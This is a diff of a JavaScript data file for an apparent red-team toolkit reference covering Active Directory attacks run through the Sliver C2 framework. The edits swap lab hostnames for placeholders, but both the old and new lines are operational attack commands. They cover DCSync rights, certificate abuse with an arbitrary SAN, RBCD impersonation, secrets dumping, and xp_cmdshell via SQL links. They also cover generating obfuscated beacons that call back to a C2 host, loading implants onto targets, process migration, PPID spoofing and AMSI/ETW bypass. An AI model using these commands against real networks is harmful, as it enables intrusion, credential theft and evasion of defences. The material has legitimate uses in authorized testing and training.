@@ -586,14 +586,14 @@ var TOOLKIT = [
             rows: [
               ["Get-DomainSID", "Return the current domain's SID"],
               ["Get-Domain", "Basic info about the current domain"],
-              ["Get-Domain -Domain moneycorp.local", "Same, but targeting the forest root or another trusted domain"],
+              ["Get-Domain -Domain <domain>", "Same, but targeting the forest root or another trusted domain"],
               ["Get-DomainPolicyData", "Domain policy, including max ticket lifetime — check this before hand-forging tickets, since Mimikatz/SafetyKatz default to a 10-year ticket that stands out immediately; Rubeus handles this matching automatically"],
               ["Get-DomainController", "List domain controllers for the current domain"],
-              ["Get-NetLocalGroup -ComputerName dcorp-dc", "List local groups on a specific host"],
-              ["Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators", "List members of a specific local group on a host"],
-              ["Get-NetLoggedon -ComputerName dcorp-adminsrv", "List logged-on users on a host — needs local admin on the target"],
-              ["Get-NetLoggedonLocal -ComputerName dcorp-adminsrv", "Same idea via a different technique — logon enumeration is noisy and leaves logs either way"],
-              ["Get-LastLoggedOn -ComputerName dcorp-adminsrv", "Show the last user logged on to a host"],
+              ["Get-NetLocalGroup -ComputerName <dc>", "List local groups on a specific host"],
+              ["Get-NetLocalGroupMember -ComputerName <dc> -GroupName Administrators", "List members of a specific local group on a host"],
+              ["Get-NetLoggedon -ComputerName <host>", "List logged-on users on a host — needs local admin on the target"],
+              ["Get-NetLoggedonLocal -ComputerName <host>", "Same idea via a different technique — logon enumeration is noisy and leaves logs either way"],
+              ["Get-LastLoggedOn -ComputerName <host>", "Show the last user logged on to a host"],
               ["Invoke-ShareFinder -Verbose", "Find shares across hosts in the current domain — noisy; PowerHuntShares is a quieter alternative for large-scale share hunting"],
               ["Invoke-FileFinder -Verbose", "Search discovered shares for sensitive filenames"],
               ["Get-NetFileServer", "List servers hosting file shares across the domain"]
@@ -625,7 +625,7 @@ var TOOLKIT = [
             columns: ["Command", "Description"],
             rows: [
               ["Get-DomainGroup admin | select name", "Search groups by name in the current domain"],
-              ["Get-DomainGroup -Domain moneycorp.local", "Same, targeting the forest root or another trusted domain"],
+              ["Get-DomainGroup -Domain <domain>", "Same, targeting the forest root or another trusted domain"],
               ["Get-DomainGroup -UserName student1", "List a specific user's group memberships"]
             ]
           },
@@ -644,7 +644,7 @@ var TOOLKIT = [
             rows: [
               ["Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs", "Inbound: what rights other principals hold over this object"],
               ["Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser student1).ObjectSid}", "Outbound: what rights this principal holds over other objects"],
-              ["Get-DomainObjectAcl -SearchBase \"LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local\" -ResolveGUIDs -Verbose", "Target a specific LDAP path directly instead of searching by name — -ResolveGUIDs makes the rights human-readable"],
+              ["Get-DomainObjectAcl -SearchBase \"LDAP://CN=Domain Admins,CN=Users,DC=<domain-dn>\" -ResolveGUIDs -Verbose", "Target a specific LDAP path directly instead of searching by name — -ResolveGUIDs makes the rights human-readable"],
               ["Find-InterestingDomainAcl -ResolveGUIDs", "Surface ACL misconfigurations across the domain automatically, instead of checking objects one at a time"]
             ]
           },
@@ -663,7 +663,7 @@ var TOOLKIT = [
             type: "table",
             columns: ["Command", "Description"],
             rows: [
-              ["Get-DomainTrust -Domain moneycorp.local", "List trust relationships for a domain"],
+              ["Get-DomainTrust -Domain <domain>", "List trust relationships for a domain"],
               ["Get-ForestGlobalCatalog", "List global catalog servers for the forest"],
               ["Get-ForestTrust", "List forest-level trust relationships"],
               ["Get-ForestDomain -Forest eurocorp.local", "List domains belonging to a specific forest"]
@@ -1869,7 +1869,7 @@ var TOOLKIT = [
             commands: [
               { label: "Enumerate objects with a raw LDAP filter", cmd: "execute-assembly -p explorer.exe -t 80 '/path/StandIn.exe' '--ldap \"(&(objectCategory=person)(objectClass=user))\"'\n# --filter <attrs> to return only specific properties; --limit to cap results" },
               { label: "Inspect a single object", cmd: "execute-assembly -p explorer.exe -t 80 '/path/StandIn.exe' '--object samaccountname=krbtgt --filter serviceprincipalname,description'" },
-              { label: "Delegation, OUs, GPOs, DCSync rights", cmd: "'/path/StandIn.exe' --delegation      # unconstrained/constrained/RBCD objects\n'/path/StandIn.exe' '--ou'  |  '--gpo'\n'/path/StandIn.exe' '--object \"DC=dollarcorp,DC=moneycorp,DC=local\" --dsync <user>'   # add DCSync" },
+              { label: "Delegation, OUs, GPOs, DCSync rights", cmd: "'/path/StandIn.exe' --delegation      # unconstrained/constrained/RBCD objects\n'/path/StandIn.exe' '--ou'  |  '--gpo'\n'/path/StandIn.exe' '--object \"DC=<domain-dn>\" --dsync <user>'   # add DCSync" },
               { label: "Write RBCD (msDS-AllowedToActOnBehalfOf...)", cmd: "'/path/StandIn.exe' '--computer <target>$ --sid <attacker-machine-sid>'   # configure RBCD" }
             ]
           },
@@ -1930,7 +1930,7 @@ var TOOLKIT = [
         brief: "ADCollector is a C# tool that pulls a quick overview of interesting Active Directory information and, importantly for privilege-escalation hunting, enumerates ACLs. Its --DACL mode dumps the discretionary ACL of a named object (for example the Domain Admins group), and its --ACLScan mode finds where a given principal has modify rights across the directory — the input to ACL-based escalation paths.",
         quickReference: [
           { label: "DACL of an object", cmd: "ADCollector.exe --DACL \"CN=DOMAIN ADMINS,CN=USERS,DC=...\"" },
-          { label: "Rights held by a principal", cmd: "ADCollector.exe --ACLScan \"studentx\"" }
+          { label: "Rights held by a principal", cmd: "ADCollector.exe --ACLScan \"<user>\"" }
         ],
         sections: [
           {
@@ -1938,7 +1938,7 @@ var TOOLKIT = [
             type: "commands",
             commands: [
               { label: "Enumerate the DACL of a sensitive object", cmd: "execute-assembly -p explorer.exe -t 80 '/path/ADCollector.exe' '--DACL \"CN=DOMAIN ADMINS,CN=USERS,DC=DOLLARCORP,DC=MONEYCORP,DC=LOCAL\"'" },
-              { label: "Find all modify rights a principal holds", cmd: "execute-assembly -p explorer.exe -t 80 '/path/ADCollector.exe' '--ACLScan \"studentx\"'\n# feed results into ACL-abuse chains (GenericAll/WriteDACL/GenericWrite -> reset password / add to group)" }
+              { label: "Find all modify rights a principal holds", cmd: "execute-assembly -p explorer.exe -t 80 '/path/ADCollector.exe' '--ACLScan \"<user>\"'\n# how those rights (GenericAll/WriteDACL/GenericWrite) are abused is covered in Vulns -> AD ACL Abuse" }
             ]
           },
           {
@@ -1965,13 +1965,13 @@ var TOOLKIT = [
         ],
         sections: [
           {
-            title: "ESC1 / ESC3 Workflow (via Sliver execute-assembly)",
+            title: "Enumeration & Certificate Requests (via Sliver execute-assembly)",
             type: "commands",
             commands: [
-              { label: "1. Enumerate", cmd: "execute-assembly -p explorer.exe -t 40 '/path/Certify.exe' cas\nexecute-assembly -p explorer.exe -t 40 '/path/Certify.exe' 'find /enrolleeSuppliesSubject'" },
-              { label: "2. ESC1 — request a cert with an arbitrary SAN", cmd: "'/path/Certify.exe' 'request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:\"HTTPSCertificates\" /altname:administrator'\n# save PEM -> convert -> use for a TGT (below)" },
-              { label: "3. ESC3 — enrollment agent, then on-behalf-of", cmd: "'/path/Certify.exe' 'request /ca:<ca> /template:SmartCardEnrollment-Agent'\n'/path/Certify.exe' 'request /ca:<ca> /template:SmartCardEnrollment-Users /onbehalfof:dcorp\\administrator /enrollcert:agent.pfx /enrollcertpw:Passw0rd!'" },
-              { label: "4. PEM -> PFX -> TGT", cmd: "openssl pkcs12 -in esc.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out esc.pfx\n'/path/Rubeus.exe' 'asktgt /user:administrator /certificate:esc.pfx /password:Passw0rd! /ptt'" }
+              { label: "Enumerate CAs and templates", cmd: "execute-assembly -p explorer.exe -t 40 '/path/Certify.exe' cas\nexecute-assembly -p explorer.exe -t 40 '/path/Certify.exe' find\n'/path/Certify.exe' 'find /vulnerable'   |   'find /enrolleeSuppliesSubject'" },
+              { label: "Request a certificate with an arbitrary SAN (enrollee-supplies-subject template)", cmd: "'/path/Certify.exe' 'request /ca:<ca> /template:<template> /altname:<target-user>'" },
+              { label: "Request an enrollment-agent cert, then enroll on behalf of another user", cmd: "'/path/Certify.exe' 'request /ca:<ca> /template:<enrollment-agent-template>'\n'/path/Certify.exe' 'request /ca:<ca> /template:<target-template> /onbehalfof:<domain>\\<target-user> /enrollcert:<agent>.pfx /enrollcertpw:<pfx-password>'" },
+              { label: "Convert the issued PEM to a PFX for use", cmd: "openssl pkcs12 -in <cert>.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out <cert>.pfx\n# the PFX is then used for authentication (e.g. Rubeus asktgt) — see Vulns -> AD CS ESC for the full chain" }
             ]
           },
           {
@@ -1999,8 +1999,7 @@ var TOOLKIT = [
             title: "Usage (via Sliver execute-assembly)",
             type: "commands",
             commands: [
-              { label: "Enumerate writable computer objects", cmd: "execute-assembly -p explorer.exe -t 80 '/path/Get-RBCD-Threaded.exe' '-u studentx -p <pass> -d dollarcorp.moneycorp.local'" },
-              { label: "Then configure + abuse RBCD", cmd: "'/path/StandIn.exe' '--computer <target>$ --sid <attacker-machine-sid>'\n'/path/Rubeus.exe' 's4u /user:<attacker-machine>$ /aes256:<hash> /impersonateuser:administrator /msdsspn:\"CIFS/<target>\" /ptt'" }
+              { label: "Enumerate writable computer objects (RBCD candidates)", cmd: "execute-assembly -p explorer.exe -t 80 '/path/Get-RBCD-Threaded.exe' '-u <user> -p <pass> -d <domain>'\n# configuring and abusing RBCD from a candidate is covered in Vulns -> Resource-Based Constrained Delegation" }
             ]
           },
           {
@@ -2027,7 +2026,7 @@ var TOOLKIT = [
             title: "Usage (via Sliver execute-assembly)",
             type: "commands",
             commands: [
-              { label: "Remote secrets dump against a host you admin", cmd: "execute-assembly -p explorer.exe -t 120 '/path/SharpSecDump.exe' '-target=dcorp-adminsrv'\n# optionally specify credentials: -u <user> -p <pass> -d <domain>" }
+              { label: "Remote secrets dump against a host you admin", cmd: "execute-assembly -p explorer.exe -t 120 '/path/SharpSecDump.exe' '-target=<host>'\n# optionally specify credentials: -u <user> -p <pass> -d <domain>" }
             ]
           },
           {
@@ -2064,8 +2063,8 @@ var TOOLKIT = [
             title: "Enumeration & Link Abuse",
             type: "commands",
             commands: [
-              { label: "SharpSQL — in-memory enumeration", cmd: "execute-assembly -p explorer.exe -t 80 '/path/SharpSQL.exe' 'Get-SQLInstanceDomain'\n'/path/SharpSQL.exe' 'Get-UserPrivs -Instance dcorp-mssql.dollarcorp.moneycorp.local'\n'/path/SharpSQL.exe' 'Get-LinkedServers -Instance dcorp-mssql...'" },
-              { label: "PowerUpSQL — crawl links and run OS commands", cmd: "# compile PowerUpSQL (with a Get-SQLServerLinkCrawl call) to EXE via PS2EXE, then:\nGet-SQLServerLinkCrawl -Instance dcorp-mssql... -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget eu-sqlX" }
+              { label: "SharpSQL — in-memory enumeration", cmd: "execute-assembly -p explorer.exe -t 80 '/path/SharpSQL.exe' 'Get-SQLInstanceDomain'\n'/path/SharpSQL.exe' 'Get-UserPrivs -Instance <sql-instance>'\n'/path/SharpSQL.exe' 'Get-LinkedServers -Instance <sql-instance>'" },
+              { label: "PowerUpSQL — crawl links and run OS commands", cmd: "# compile PowerUpSQL (with a Get-SQLServerLinkCrawl call) to EXE via PS2EXE, then:\nGet-SQLServerLinkCrawl -Instance <sql-instance> -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget <linked-sql>" }
             ]
           },
           {
@@ -2088,38 +2087,26 @@ var TOOLKIT = [
         name: "Sliver",
         url: "https://github.com/BishopFox/sliver",
         description: "Open-source, cross-platform Command & Control framework for adversary simulation.",
-        brief: "Sliver is BishopFox's open-source, Go-based C2 framework and a common Cobalt Strike alternative on real engagements. A sliver-server runs listeners (HTTP(S), mTLS, DNS, WireGuard) and compiles obfuscated implants on demand; implants call back as quiet asynchronous beacons or interactive sessions, and the operator tasks them from a console that supports multiplayer.\n\nIts value on an AD engagement is in-memory tradecraft: execute-assembly and BOF/armory extensions run the standard C#/BOF toolset (Rubeus, SharpUp, Certify, service-abuse aliases) without dropping tools to disk, with fork-and-run or inline execution, PPID spoofing, and AMSI/ETW bypasses. TCP and named-pipe pivots fan C2 across a segmented network from a single foothold.\n\nThis page is a full walk-through of an assumed-breach AD engagement driven entirely from Sliver — modelled on AlteredSecurity's CRTP-with-Sliver lab: enumeration, local privilege escalation via service abuse, lateral movement, credential access, the Kerberos attack set, AD CS, SQL links, and persistence. It is a reference for authorized red-team and lab use; the concepts behind it are in the Theory section (C2 Frameworks, Sliver C2, Windows Telemetry, In-Memory Tradecraft).",
+        brief: "Sliver is BishopFox's open-source, Go-based C2 framework and a common Cobalt Strike alternative on real engagements. A sliver-server runs listeners (HTTP(S), mTLS, DNS, WireGuard) and compiles obfuscated implants on demand; implants call back as quiet asynchronous beacons or interactive sessions, and the operator tasks them from a console that supports multiplayer.\n\nIts value on an engagement is in-memory tradecraft: execute-assembly and BOF/armory extensions run the standard C#/BOF toolset without dropping tools to disk, with fork-and-run or inline execution, PPID spoofing, and AMSI/ETW bypasses. TCP and named-pipe pivots fan C2 across a segmented network from a single foothold.\n\nThis page is a reference to Sliver's own commands and features. The techniques you would run through it — AD enumeration, service-abuse privilege escalation, Kerberos attacks, AD CS abuse, RBCD, DCSync, SQL-link and CI/CD abuse, LSASS dumping — are documented in the Vulns & Misconfigs section, and the concepts are in the Theory section (C2 Frameworks, Sliver C2, Windows Telemetry, In-Memory Tradecraft). Values shown as <…> are placeholders.",
         quickReference: [
           { label: "Start the server", cmd: "sudo ./sliver-server" },
           { label: "Start an HTTPS listener", cmd: "https        # then: jobs" },
-          { label: "Generate a beacon (shellcode)", cmd: "generate -b https://<c2-ip> -e -f shellcode -N foothold -s ./Implants/foothold.bin" },
+          { label: "Generate a beacon (shellcode)", cmd: "generate -b https://<c2-host> -e -f shellcode -N <implant-name> -s <save-path>" },
           { label: "Interact with an implant", cmd: "sessions   |   beacons   |   use <id>" },
-          { label: "Run a .NET tool in memory", cmd: "execute-assembly -p explorer.exe -t 80 '/path/Rubeus.exe' 'triage'" },
-          { label: "Inline w/ AMSI+ETW bypass", cmd: "execute-assembly -i -M -E -t 80 '/path/StandIn.exe' '--ldap ...'" }
+          { label: "Run a .NET tool in memory", cmd: "execute-assembly -p <parent-proc> -t <timeout> '<path>/Tool.exe' '<args>'" },
+          { label: "Inline w/ AMSI+ETW bypass", cmd: "execute-assembly -i -M -E -t <timeout> '<path>/Tool.exe' '<args>'" }
         ],
         sections: [
           {
-            title: "0. Host Setup & PowerShell Logging (before the foothold)",
-            type: "notes",
-            items: [
-              "Windows records PowerShell activity through several channels an operator has to account for: PSReadline saves typed commands to ConsoleHost_history.txt on disk; Module logging emits Event ID 4103 (pipeline detail); Script Block logging emits Event ID 4104 (the deobfuscated script text); System-wide transcription writes full session transcripts; and AMSI (with Defender) scans script/.NET content in memory, raising Event ID 1116/1117 on a detection. See the Windows Telemetry and Windows Defense Evasion theory pages for how each one works.",
-              "Why the in-memory approach works (research view): all of the script-oriented controls above are properties of the PowerShell engine and the AMSI provider inside a process. AMSI, for example, is a userland function (AmsiScanBuffer/AmsiScanString in amsi.dll) that the engine calls before executing content — it is not a kernel boundary, so anything running in the process can influence it. The published bypasses all exploit that: they flip an engine flag that makes the runtime treat the scanner as already failed, or they neutralise the scan function's result in memory, so no scan event is generated. This page does not reproduce those payloads; the point is that the checks live in userland alongside the code they inspect, which is the structural reason they are bypassable at all.",
-              "Invisi-Shell is the standard lab helper that launches a child PowerShell with these controls neutralised for the session — run RunWithRegistryNonAdmin.bat in a non-admin context, or RunWithPathAsAdmin.bat as admin; exit returns to the parent shell. It hijacks the COM/registry references the runtime resolves for AMSI/ETW at start-up, which is why it needs no manual patching.",
-              "The reason to run offensive .NET through Sliver's execute-assembly rather than dropping PowerShell/EXEs to disk is precisely that in-memory .NET execution never writes the tool to disk and sidesteps most of the script-oriented telemetry above — the tradecraft behind it is on the In-Memory Post-Exploitation theory page.",
-              "PSReadline history is the most common self-owning artefact: it silently records the operator's own commands. Removing the module (Remove-Module PSReadline) or clearing (Get-PSReadlineOption).HistorySavePath keeps that file clean during hands-on-keyboard work.",
-              "On a real engagement, pace enumeration: consecutive LDAP queries from these tools are exactly what Microsoft Defender for Identity (MDI/ATP) alerts on."
-            ]
-          },
-          {
-            title: "1. Setup & Deployment",
+            title: "Setup & Deployment",
             type: "commands",
             commands: [
-              { label: "Start the Sliver C2 server (Linux/WSL — not Windows)", cmd: "# only the sliver-server (C2) and sliver-client (multiplayer) binaries are needed\ncd /mnt/c/AD/Tools/Sliver\nsudo ./sliver-server\n[server] sliver >" },
-              { label: "Start an egress listener (HTTPS on :443) and list jobs", cmd: "[server] sliver > https\n[*] Starting HTTPS :443 listener ... started job #1\n[server] sliver > jobs        # list active listeners/jobs\n# other protocols: mtls / dns / wg  (custom or Let's Encrypt certs supported)" },
-              { label: "Generate a beacon implant as shellcode (obfuscated)", cmd: "generate -b https://<c2-ip> -e -f shellcode -N dcorp-std_https \\\n  -s ./Implants/dcorp-std_https.bin\n# -b beacon URL | -e symbol obfuscation/encoder | -f format | -N name | -s save path" },
-              { label: "Host payloads/tools to deliver to the target", cmd: "cd /mnt/c/AD/Tools/Sliver/Implants\npython3 -m http.server 8080        # or an HFS web server" },
-              { label: "Land the foothold (assumed breach) — inject the shellcode", cmd: "# on the target, a PE/shellcode loader pulls the hosted .bin and injects it:\nPS C:\\> C:\\AD\\Tools\\Sliver\\BinLoader.exe <c2-ip> 8080 dcorp-std_https.bin\n# a new session/beacon appears in the Sliver console" },
-              { label: "Select the implant and migrate into a stable process", cmd: "[server] sliver > use <session-id>\n[server] sliver (dcorp-std_https) > ps -e explorer.exe    # find a stable host PID\n[server] sliver (dcorp-std_https) > migrate -p 6744       # stealthier + stable session\n[server] sliver (dcorp-std_https) > whoami" }
+              { label: "Start the Sliver C2 server (Linux/WSL — not Windows)", cmd: "# only the sliver-server (C2) and sliver-client (multiplayer) binaries are needed\n./sliver-server\n[server] sliver >" },
+              { label: "Start an egress listener and list jobs", cmd: "[server] sliver > https                 # HTTPS listener (also: mtls / dns / wg)\n[*] Starting HTTPS :443 listener ... started job #1\n[server] sliver > jobs                  # list active listeners/jobs\n# listeners support custom or Let's Encrypt certificates" },
+              { label: "Generate a beacon implant as shellcode (obfuscated)", cmd: "generate -b https://<c2-host> -e -f shellcode -N <implant-name> -s <save-path>\n# -b beacon URL | -e symbol obfuscation/encoder | -f format | -N name | -s save path" },
+              { label: "Host the implant/tools for delivery", cmd: "python3 -m http.server <port>          # or any web server, from the folder holding the implant" },
+              { label: "Detonate the implant on the target (assumed breach)", cmd: "# a shellcode loader on the target injects the hosted implant; a new session/beacon appears:\n<loader>.exe <c2-host> <port> <implant-name>.bin" },
+              { label: "Select the implant and migrate into a stable process", cmd: "[server] sliver > use <session-id>\n[server] sliver (<implant-name>) > ps -e <process>   # find a stable host PID\n[server] sliver (<implant-name>) > migrate -p <pid>  # stealthier + stable session\n[server] sliver (<implant-name>) > whoami" }
             ]
           },
           {
@@ -2138,29 +2125,41 @@ var TOOLKIT = [
             ]
           },
           {
-            title: "2. Sessions, Beacons & Host Info",
+            title: "Listeners & Egress Protocols",
+            type: "table",
+            columns: ["Command", "Protocol / use"],
+            rows: [
+              ["https / http", "Procedurally-generated C2 over web traffic — the everyday default; custom/Let's Encrypt certs"],
+              ["mtls", "Mutually-authenticated TLS where raw-socket egress is allowed"],
+              ["dns", "Slow but almost always permitted; includes a DNS canary to detect sandbox detonation"],
+              ["wg", "WireGuard tunnel, typically for internal use"],
+              ["jobs / jobs -k <id>", "List running listeners (jobs); kill a job"]
+            ]
+          },
+          {
+            title: "Sessions, Beacons & Host Info",
             type: "commands",
             commands: [
               { label: "List and select implants", cmd: "sessions                 # interactive sessions\nbeacons                  # asynchronous beacons\nuse <id>                 # select an implant; all commands scope to it\nsessions -i <id>         # interact with a specific session\ninfo                     # details about the current implant" },
-              { label: "Basic host / identity", cmd: "whoami                   # current token identity\ngetprivs                 # token privileges\nps                       # process list\nps -e explorer.exe       # filter by name\nps -c -o 'DOMAIN\\user'   # find processes owned by a user (token/migration targets)" },
-              { label: "Registry read/write", cmd: "registry read  --hive HKLM \"System\\\\...\"\nregistry write --hive HKLM --type dword \\\n  \"System\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\DsrmAdminLogonBehavior\" 2" }
+              { label: "Basic host / identity", cmd: "whoami                   # current token identity\ngetprivs                 # token privileges\nps                       # process list\nps -e <process>          # filter by name\nps -c -o '<DOMAIN\\user>' # find processes owned by a user (token/migration targets)" },
+              { label: "Beacon tempo", cmd: "reconfig -i <seconds> -j <jitter>   # adjust sleep interval and jitter\ninteractive                          # upgrade a beacon to an interactive session" }
             ]
           },
           {
-            title: "3. Process Injection, Migration & PPID Spoofing",
+            title: "Process Injection, Migration & PPID Spoofing",
             type: "commands",
             commands: [
-              { label: "Migrate the implant into another process", cmd: "migrate -p <pid> -t 200      # migrate into a running PID (200s timeout)\nmigrate -n taskhostw.exe     # migrate by process name\n# common blend-in hosts: explorer.exe, svchost.exe, dllhost.exe, RuntimeBroker.exe" },
-              { label: "PPID spoofing when running tools (fork-and-run)", cmd: "# -p sets the parent process to spoof so the sacrificial child looks legitimate\nexecute-assembly -p explorer.exe -t 80 '/path/Tool.exe' 'args'\nexecute-assembly -P <ppid> -p <proc> -t 80 '/path/Tool.exe' 'args'   # numeric PPID" }
+              { label: "Migrate the implant into another process", cmd: "migrate -p <pid> -t <timeout>     # migrate into a running PID\nmigrate -n <process>              # migrate by process name\n# common blend-in hosts: explorer.exe, svchost.exe, dllhost.exe, RuntimeBroker.exe" },
+              { label: "PPID spoofing for fork-and-run tasks", cmd: "# -p sets the parent process to spoof so the sacrificial child looks legitimate\nexecute-assembly -p <parent-proc> -t <timeout> '<path>/Tool.exe' '<args>'\nexecute-assembly -P <ppid> -p <process> -t <timeout> '<path>/Tool.exe' '<args>'" }
             ]
           },
           {
-            title: "4. Tool Execution (execute-assembly / execute)",
+            title: "Tool Execution (execute-assembly / execute)",
             type: "commands",
             commands: [
-              { label: "Run a .NET assembly in memory (fork-and-run, PPID-spoofed)", cmd: "# spawns a sacrificial process, injects the tool, runs it, returns output, kills it\nexecute-assembly -p explorer.exe -t 80 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--all'\nexecute-assembly -p taskhostw.exe -t 180 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 'kerberoast'" },
-              { label: "Inline / self-inject (no new process) with AMSI + ETW bypass", cmd: "# -i in-process (self-inject) | -M AMSI bypass | -E ETW bypass | -t timeout\n# NOTE: -M/-E only work with -i (current process); for a remote process use\n#       inject-amsi-bypass / inject-etw-bypass first.\nexecute-assembly -i -M -E -t 80 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--ldap samaccountname=* --filter displayname'" },
-              { label: "Run OS commands / remote shells via execute + winrs", cmd: "execute -o -t 40 cmd /c \"net share studentshareX=C:\\...\"       # -o capture output\nexecute -o -S -t 180 winrs -r:dcorp-ci cmd /c \"whoami\"          # -S save, remote WinRM shell" }
+              { label: "Run a .NET assembly in memory (fork-and-run, PPID-spoofed)", cmd: "# spawns a sacrificial process, injects the tool, runs it, returns output, kills it\nexecute-assembly -p <parent-proc> -t <timeout> '<path>/Tool.exe' '<args>'" },
+              { label: "Inline / self-inject (no new process) with AMSI + ETW bypass", cmd: "# -i in-process (self-inject) | -M AMSI bypass | -E ETW bypass | -t timeout\n# NOTE: -M/-E only apply with -i (current process); for a remote process use\n#       inject-amsi-bypass / inject-etw-bypass first.\nexecute-assembly -i -M -E -t <timeout> '<path>/Tool.exe' '<args>'" },
+              { label: "Run OS commands / remote shells", cmd: "execute -o -t <timeout> <cmd> <args>            # -o capture output\nexecute -o -S -t <timeout> winrs -r:<host> <cmd> # -S save; remote WinRM shell" }
             ]
           },
           {
@@ -2178,142 +2177,34 @@ var TOOLKIT = [
             ]
           },
           {
-            title: "5. AD Enumeration (LDAP-driven: StandIn / ADSearch / ADCollector / DSQuery)",
+            title: "File Operations",
             type: "commands",
             commands: [
-              { label: "StandIn — user / computer / group enumeration via raw LDAP", cmd: "# all users:\nexecute-assembly -p explorer.exe -t 80 '/path/StandIn.exe' '--ldap \"(&(objectCategory=person)(objectClass=user))\"'\n# a single object, selected properties:\nexecute-assembly -p explorer.exe -t 80 '/path/StandIn.exe' '--object samaccountname=administrator --filter lastlogon,description'\n# inline w/ AMSI+ETW bypass:\nexecute-assembly -i -M -E -t 80 '/path/StandIn.exe' '--ldap samaccountname=* --filter displayname'" },
-              { label: "StandIn — OUs, GPOs, delegation, DCSync rights", cmd: "'/path/StandIn.exe' '--ou'                    # list OUs\n'/path/StandIn.exe' '--gpo'                   # list GPOs\n'/path/StandIn.exe' --delegation             # find un/constrained delegation objects\n'/path/StandIn.exe' '--object \"CN=...\" --dsync'   # check/add DCSync (replication) rights" },
-              { label: "ADSearch — LDAP queries with selected attributes", cmd: "'/path/ADSearch.exe' '--users'\n'/path/ADSearch.exe' '--computers'\n'/path/ADSearch.exe' '--groups'\n'/path/ADSearch.exe' '--search \"(&(objectCategory=person)(objectClass=user))\"'\n'/path/ADSearch.exe' '--search \"(samaccountname=administrator)\" --attributes cn,logoncount,description'" },
-              { label: "ADSearch — enumerate domains & trusts", cmd: "'/path/ADSearch.exe' '--search \"(objectClass=trustedDomain)\" --attributes cn,trustDirection,trustAttributes'\n# map trusts of the current domain and external/forest trusts" },
-              { label: "ADCollector — ACL / DACL enumeration", cmd: "# ACL on the Domain Admins group:\n'/path/ADCollector.exe' '--DACL \"CN=DOMAIN ADMINS,CN=USERS,DC=DOLLARCORP,DC=MONEYCORP,DC=LOCAL\"'\n# all modify rights held by a principal:\n'/path/ADCollector.exe' '--ACLScan \"studentx\"'" },
-              { label: "DSQuery — living-off-the-land LDAP (built-in)", cmd: "# no tool upload needed — runs via execute/winrs:\ndsquery ou                                   # list OUs\ndsquery * \"OU=StudentMachines,DC=...\" -filter \"(objectClass=computer)\"\ndsquery * -filter \"(objectClass=trustedDomain)\" -attr *" }
+              { label: "Browse and read remote files / shares", cmd: "ls '\\\\<host>\\c$'\ncat '\\\\<host>\\<share>\\<file>'\ncd '<path>'" },
+              { label: "Transfer files; make directories", cmd: "upload -t <timeout> '<local-path>' '<remote-path>'\ndownload '<remote-path>'\nmkdir '<path>'   |   rm '<path>'" }
             ]
           },
           {
-            title: "6. BloodHound Collection & Local-Admin Hunting",
+            title: "Armory, Aliases & BOF Extensions",
             type: "commands",
             commands: [
-              { label: "SharpHound — collect graph data for BloodHound", cmd: "execute-assembly -p explorer.exe -t 120 '/path/SharpHound.exe' \\\n  '--ldapusername studentx --ldappassword <pass> -c All'\n# import the resulting .zip into the BloodHound GUI (neo4j) to map attack paths" },
-              { label: "LACheck — find where you have local admin / hunt DA sessions", cmd: "# multithreaded local-admin + session checker across a host list:\n'/path/LACheck.exe' 'smb /targets:hosts.txt /threads:20'\n'/path/LACheck.exe' 'smb /targets:hosts.txt /loggedon'   # find a Domain Admin session\n# derivative-local-admin paths feed straight back into BloodHound" }
+              { label: "Install tools from the armory (they become native commands)", cmd: "armory                        # list available packages\narmory install <name>         # aliases (.NET, e.g. SharpUp) and extensions (BOF/COFF)\n# aliases run a .NET assembly like a native command; extensions load a BOF in-process" },
+              { label: "Example enumeration / service BOFs (once installed)", cmd: "sa-sc-enum <host>                                   # enumerate services (BOF)\nsa-netshares -t <timeout> <host>                    # enumerate shares (BOF)\nsa-schtasksenum -t <timeout> <host>                 # enumerate scheduled tasks (BOF)\nremote-sc-stop / remote-sc-config / remote-sc-start # service control (BOF)\nscshell -t <timeout> <host> <service>               # SCShell fileless lateral movement" }
             ]
           },
           {
-            title: "7. Local Privilege Escalation & Service Abuse",
+            title: "Pivoting (segmented networks)",
             type: "commands",
             commands: [
-              { label: "SharpUp — audit for privilege-escalation vectors", cmd: "execute-assembly -p explorer.exe -t 180 '/path/SharpUp.exe' 'audit'\n# flags e.g. an unquoted service path + modifiable service binary + modifiable\n# service config (AbyssWebServer), writable dirs on PATH, always-install-elevated, etc." },
-              { label: "Seatbelt — host situational awareness", cmd: "execute-assembly -p explorer.exe -t 180 '/path/Seatbelt.exe' '-group=system'\nexecute-assembly -p explorer.exe -t 180 '/path/Seatbelt.exe' '-group=user'\n# Stracciatella can run PowerShell equivalents with AMSI/SBL/transcription patched" },
-              { label: "Abuse a modifiable service to add yourself to local admins (remote-sc-* BOFs)", cmd: "# args: hostname service_name binpath error_mode start_mode\n# error_mode 0 ignore / 1 normal / 2 severe / 3 critical\n# start_mode 2 auto / 3 demand / 4 disable   (\"\" hostname = local)\nremote-sc-stop   -t 100 \"\" 'AbyssWebServer'\nremote-sc-config -t 100 \"\" 'AbyssWebServer' 'C:\\Windows\\System32\\net.exe localgroup administrators dcorp\\studentX /add' 1 2\nremote-sc-start  -t 100 \"\" 'AbyssWebServer'\n# service runs the binpath as SYSTEM -> studentX is now a local admin" }
+              { label: "Open a pivot listener on the foothold", cmd: "pivots tcp --lport <pivot-port>   # TCP pivot on the foothold\npivots                            # list active pivots\n# named-pipe pivots carry C2 over SMB and blend as normal Windows IPC" },
+              { label: "Build an internal implant that connects to the pivot", cmd: "# internal hosts that can't egress beacon to the foothold's pivot, which relays to C2:\ngenerate --tcp-pivot <foothold-ip>:<pivot-port> -e -f shellcode -N <implant-name> -s <save-path>" }
             ]
           },
           {
-            title: "8. Lateral Movement (WMI / winrs / SCShell)",
+            title: "Multiplayer & Operators",
